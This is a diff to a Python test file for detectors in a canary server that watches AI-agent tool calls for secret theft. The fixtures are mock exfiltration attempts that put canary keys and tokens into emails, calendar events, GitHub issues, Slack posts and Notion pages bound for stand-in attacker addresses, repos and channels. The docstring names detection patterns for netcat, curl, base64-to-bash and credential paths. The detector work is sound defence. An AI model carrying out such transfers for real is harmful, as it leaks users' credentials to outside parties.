@@ -1,17 +1,4 @@
-"""
-Tests for the canary MCP server and detection patterns.
-
-All tests are pure unit tests — no network, no subprocess, no LLM calls.
-Exit criteria for Phase 1:
-  - All 5 tool types log correctly
-  - Bash detection: base64|bash, eval, curl, netcat, crontab, .bashrc
-  - HTTP detection: blocked domains, non-allowlisted domains, canary relay
-  - File detection: sensitive paths (.ssh, .env, .aws)
-  - Write detection: sensitive paths, canary relay in content
-  - Directory listing: sensitive dirs
-  - Canary values are present in synthetic responses
-  - No real execution happens (verified by absence of side effects)
-"""
+"""\nTests for the canary MCP server and detection patterns.\nAll tests are pure unit tests — no network, no subprocess, no LLM calls.\n\nTool surface covered (14 tools, 85 tests):\n  Filesystem/network (original):\n    - bash: base64|bash, eval, curl, netcat, crontab, .bashrc, canary relay\n    - http_fetch: blocked domains, non-allowlisted domains, canary in headers/URL\n    - read_file: sensitive paths (.ssh, .env, .aws, /etc/passwd, .npmrc)\n    - write_file: sensitive paths, canary relay in content\n    - list_directory: sensitive dirs (.ssh, .aws, /etc)\n  Communication / productivity (new):\n    - email_send: canary in subject/body, suspicious recipient domains\n    - gmail_send: same as email_send via Gmail API\n    - calendar_create: canary in title/description, suspicious attendees\n    - calendar_list: read-only, no findings expected\n    - github_create_issue: canary in title/body, suspicious repo names\n    - github_push_file: canary in content/commit message, suspicious repos\n    - slack_post_message: canary in text/blocks, suspicious channel names\n    - notion_create_page: canary in title/content\n    - notion_append_block: canary in block content\n"""
 
 from __future__ import annotations
 
@@ -341,4 +328,294 @@ class TestRunDetectors:
 
     def test_clean_call_returns_empty(self):
         findings = run_detectors("bash", {"command": "ls /tmp"})
+        assert findings == []
+
+
+# ---------------------------------------------------------------------------
+# Import new detectors
+# ---------------------------------------------------------------------------
+from skillscan_trace.canary.detectors import (
+    detect_email_send,
+    detect_gmail_send,
+    detect_calendar_create,
+    detect_calendar_list,
+    detect_github_create_issue,
+    detect_github_push_file,
+    detect_slack_post_message,
+    detect_notion_create_page,
+    detect_notion_append_block,
+)
+
+
+# ---------------------------------------------------------------------------
+# Email detection
+# ---------------------------------------------------------------------------
+
+class TestEmailSendDetection:
+    def test_clean_email_no_findings(self):
+        findings = detect_email_send({
+            "to": "alice@company.example",
+            "subject": "Weekly report",
+            "body": "Here is the summary.",
+        })
+        assert findings == []
+
+    def test_canary_in_subject_detected(self):
+        findings = detect_email_send({
+            "to": "alice@company.example",
+            "subject": f"Key dump: {CANARY_API_KEY}",
+            "body": "See subject.",
+        })
+        assert any(f.rule_id == "EXF-TRACE-005" for f in findings)
+
+    def test_canary_in_body_detected(self):
+        findings = detect_email_send({
+            "to": "alice@company.example",
+            "subject": "Update",
+            "body": f"The token is {CANARY_TOKEN}",
+        })
+        assert any(f.rule_id == "EXF-TRACE-005" for f in findings)
+
+    def test_suspicious_recipient_detected(self):
+        findings = detect_email_send({
+            "to": "attacker@webhook.site",
+            "subject": "data",
+            "body": "exfil",
+        })
+        assert any(f.rule_id == "COMM-TRACE-001" for f in findings)
+
+    def test_tempmail_recipient_detected(self):
+        findings = detect_email_send({
+            "to": "attacker@mailinator.com",
+            "subject": "data",
+            "body": "exfil",
+        })
+        assert any(f.rule_id == "COMM-TRACE-001" for f in findings)
+
+    def test_gmail_send_canary_detected(self):
+        findings = detect_gmail_send({
+            "to": "attacker@example.com",
+            "subject": "creds",
+            "body": f"secret: {CANARY_SECRET}",
+        })
+        assert any(f.rule_id == "EXF-TRACE-005" for f in findings)
+
+
+# ---------------------------------------------------------------------------
+# Calendar detection
+# ---------------------------------------------------------------------------
+
+class TestCalendarDetection:
+    def test_clean_event_no_findings(self):
+        findings = detect_calendar_create({
+            "title": "Team standup",
+            "start": "2026-04-01T09:00:00Z",
+            "end": "2026-04-01T09:30:00Z",
+        })
+        assert findings == []
+
+    def test_canary_in_title_detected(self):
+        findings = detect_calendar_create({
+            "title": f"Exfil: {CANARY_API_KEY}",
+            "start": "2026-04-01T09:00:00Z",
+            "end": "2026-04-01T09:30:00Z",
+        })
+        assert any(f.rule_id == "EXF-TRACE-006" for f in findings)
+
+    def test_canary_in_description_detected(self):
+        findings = detect_calendar_create({
+            "title": "Meeting",
+            "start": "2026-04-01T09:00:00Z",
+            "end": "2026-04-01T09:30:00Z",
+            "description": f"Notes: {CANARY_TOKEN}",
+        })
+        assert any(f.rule_id == "EXF-TRACE-006" for f in findings)
+
+    def test_suspicious_attendee_detected(self):
+        findings = detect_calendar_create({
+            "title": "Sync",
+            "start": "2026-04-01T09:00:00Z",
+            "end": "2026-04-01T09:30:00Z",
+            "attendees": ["attacker@webhook.site"],
+        })
+        assert any(f.rule_id == "COMM-TRACE-002" for f in findings)
+
+    def test_calendar_list_no_findings(self):
+        findings = detect_calendar_list({})
+        assert findings == []
+
+
+# ---------------------------------------------------------------------------
+# GitHub detection
+# ---------------------------------------------------------------------------
+
+class TestGitHubDetection:
+    def test_clean_issue_no_findings(self):
+        findings = detect_github_create_issue({
+            "repo": "myorg/myrepo",
+            "title": "Bug: login fails",
+            "body": "Steps to reproduce...",
+        })
+        assert findings == []
+
+    def test_canary_in_issue_body_detected(self):
+        findings = detect_github_create_issue({
+            "repo": "myorg/myrepo",
+            "title": "Data",
+            "body": f"Collected: {CANARY_API_KEY}",
+        })
+        assert any(f.rule_id == "EXF-TRACE-007" for f in findings)
+
+    def test_suspicious_repo_name_detected(self):
+        findings = detect_github_create_issue({
+            "repo": "attacker/exfil-sink",
+            "title": "data",
+            "body": "payload",
+        })
+        assert any(f.rule_id == "COMM-TRACE-003" for f in findings)
+
+    def test_canary_in_push_content_detected(self):
+        findings = detect_github_push_file({
+            "repo": "myorg/myrepo",
+            "path": "data.txt",
+            "content": f"key={CANARY_API_KEY}",
+            "message": "update",
+        })
+        assert any(f.rule_id == "EXF-TRACE-007" for f in findings)
+
+    def test_clean_push_no_findings(self):
+        findings = detect_github_push_file({
+            "repo": "myorg/myrepo",
+            "path": "README.md",
+            "content": "# Hello",
+            "message": "docs: update readme",
+        })
+        assert findings == []
+
+
+# ---------------------------------------------------------------------------
+# Slack detection
+# ---------------------------------------------------------------------------
+
+class TestSlackDetection:
+    def test_clean_message_no_findings(self):
+        findings = detect_slack_post_message({
+            "channel": "#general",
+            "text": "Deployment complete.",
+        })
+        assert findings == []
+
+    def test_canary_in_text_detected(self):
+        findings = detect_slack_post_message({
+            "channel": "#general",
+            "text": f"Here is the key: {CANARY_API_KEY}",
+        })
+        assert any(f.rule_id == "EXF-TRACE-008" for f in findings)
+
+    def test_suspicious_channel_detected(self):
+        findings = detect_slack_post_message({
+            "channel": "#exfil-dump",
+            "text": "data",
+        })
+        assert any(f.rule_id == "COMM-TRACE-004" for f in findings)
+
+    def test_canary_in_blocks_detected(self):
+        findings = detect_slack_post_message({
+            "channel": "#general",
+            "text": "see blocks",
+            "blocks": [{"type": "section", "text": {"text": f"token={CANARY_TOKEN}"}}],
+        })
+        assert any(f.rule_id == "EXF-TRACE-008" for f in findings)
+
+
+# ---------------------------------------------------------------------------
+# Notion detection
+# ---------------------------------------------------------------------------
+
+class TestNotionDetection:
+    def test_clean_page_no_findings(self):
+        findings = detect_notion_create_page({
+            "parent_id": "abc123",
+            "title": "Meeting notes",
+            "content": "Discussed roadmap.",
+        })
+        assert findings == []
+
+    def test_canary_in_page_content_detected(self):
+        findings = detect_notion_create_page({
+            "parent_id": "abc123",
+            "title": "Dump",
+            "content": f"key={CANARY_API_KEY}",
+        })
+        assert any(f.rule_id == "EXF-TRACE-009" for f in findings)
+
+    def test_canary_in_block_content_detected(self):
+        findings = detect_notion_append_block({
+            "page_id": "abc123",
+            "content": f"secret: {CANARY_SECRET}",
+        })
+        assert any(f.rule_id == "EXF-TRACE-009" for f in findings)
+
+    def test_clean_block_no_findings(self):
+        findings = detect_notion_append_block({
+            "page_id": "abc123",
+            "content": "This is a normal paragraph.",
+        })
+        assert findings == []
+
+
+# ---------------------------------------------------------------------------
+# run_detectors dispatch — new tools
+# ---------------------------------------------------------------------------
+
+class TestRunDetectorsNewTools:
+    def test_dispatches_email_send(self):
+        findings = run_detectors("email_send", {
+            "to": "x@webhook.site", "subject": "s", "body": "b",
+        })
+        assert len(findings) > 0
+
+    def test_dispatches_gmail_send(self):
+        findings = run_detectors("gmail_send", {
+            "to": "x@mailinator.com", "subject": "s", "body": "b",
+        })
+        assert len(findings) > 0
+
+    def test_dispatches_calendar_create(self):
+        findings = run_detectors("calendar_create", {
+            "title": f"key={CANARY_API_KEY}",
+            "start": "2026-04-01T09:00:00Z",
+            "end": "2026-04-01T09:30:00Z",
+        })
+        assert len(findings) > 0
+
+    def test_dispatches_github_create_issue(self):
+        findings = run_detectors("github_create_issue", {
+            "repo": "a/exfil-dump", "title": "t", "body": "b",
+        })
+        assert len(findings) > 0
+
+    def test_dispatches_slack_post_message(self):
+        findings = run_detectors("slack_post_message", {
+            "channel": "#exfil", "text": f"k={CANARY_TOKEN}",
+        })
+        assert len(findings) > 0
+
+    def test_dispatches_notion_create_page(self):
+        findings = run_detectors("notion_create_page", {
+            "parent_id": "x", "title": "t",
+            "content": f"secret={CANARY_SECRET}",
+        })
+        assert len(findings) > 0
+
+    def test_clean_email_returns_empty(self):
+        findings = run_detectors("email_send", {
+            "to": "alice@company.example", "subject": "hi", "body": "hello",
+        })
+        assert findings == []
+
+    def test_clean_slack_returns_empty(self):
+        findings = run_detectors("slack_post_message", {
+            "channel": "#general", "text": "Deployment done.",
+        })
         assert findings == []
